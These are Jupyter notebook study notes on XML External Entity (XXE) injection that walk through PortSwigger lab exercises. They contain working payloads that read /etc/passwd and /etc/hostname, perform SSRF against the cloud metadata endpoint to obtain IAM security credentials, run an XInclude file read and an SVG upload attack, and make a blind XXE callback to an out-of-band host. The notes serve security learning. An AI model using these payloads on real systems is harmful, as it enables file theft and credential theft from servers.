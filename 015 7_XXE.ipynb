{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--------------------------------------------------------------------------------------------\n",
    "                          # XML External Entity Injection (XXE)                             "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Resources:\n",
    "\n",
    ">> Labs:\n",
    "   - https://portswigger.net/web-security/xxe\n",
    "   \n",
    ">> Video:\n",
    "   - https://www.youtube.com/watch?v=rrz7weS_3Ek&list=PLTSGZiCtCBfMMLkmaN7tGEhbc0QbOEtEA&index=22"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">> What is XML external entity injection?\n",
    "   - XML external entity injection (XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.\n",
    "   \n",
    ">> How do XXE vulnerabilities arise?\n",
    "   - XML format used to transmit data between the browser and the server.\n",
    "   - XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.\n",
    "   \n",
    ">> What are the types of XXE attacks?\n",
    "   - Exploiting XXE to retrieve files, where an external entity is defined containing the contents of a file, and returned in the application's response.\n",
    "   - Exploiting XXE to perform SSRF attacks, where an external entity is defined based on a URL to a back-end system.\n",
    "   - Exploiting blind XXE exfiltrate data out-of-band, where sensitive data is transmitted from the application server to a system that the attacker controls.\n",
    "   - Exploiting blind XXE to retrieve data via error messages, where the attacker can trigger a parsing error message containing sensitive data.\n",
    "\n",
    "```html\n",
    ">> The payload of the XXE is \n",
    "   - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"YOUR_URL - YOUR_File_Path\"> ]>\n",
    "   - Then add (\" &xxe; \") in the excutable line\n",
    "   \n",
    ">> The payload of the Blind XXE is\n",
    "   - <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"YOUR_URL - YOUR_File_Path\"> %xxe; ]>\n",
    "   - <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://sdfasdadfs.burpcollaborator.net\"> %xxe;]>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-1: Exploiting XXE using external entities to retrieve files:\n",
    "\n",
    "- intercept the request of checking stock of any product\n",
    "- below the <?xml> tag add the payload to exploit the XXE vuln\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> ```\n",
    "- then change the num in the <productId> tags to (\" &xxe; \")\n",
    "- the response will contain the data of the passwd file"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-2: Exploiting XXE to perform SSRF attacks:\n",
    "\n",
    "- intercept the request of checking stock of any product\n",
    "- below the <?xml> tag add the payload to exploit the XXE vuln\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/\"> ]> ```\n",
    "- then change the num in the <productId> tags to (\" &xxe; \")\n",
    "- the response of the request will be the next folder name \n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest\"> ]> ```\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data\"> ]> ```\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam\"> ]> ```\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials\"> ]> ```\n",
    "- ``` <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin\"> ]> ```\n",
    "- the response will contain the data of the server's IAM secret access key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-3: Exploiting XInclude to retrieve files:\n",
    "\n",
    "- intercept the request of chacking stock\n",
    "- add the payload \n",
    "- ``` <foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"> ```\n",
    "- ``` <xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo> ```\n",
    "- in the \"productId\" and send the request \n",
    "- the response will contain the data of the passwd file "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Lab-4: Exploiting XXE via image file upload: \n",
    "\n",
    "- Create new file named \"file.svg\" and write on it \n",
    "- ``` <?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\" > ]><svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\"><text font-size=\"16\" x=\"0\" y=\"16\">&xxe;</text></svg> ```\n",
    "- then open any post and type a comment and uplaod this file as an avatar\n",
    "- you'll see the \"hostname\" in the avatar photo"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
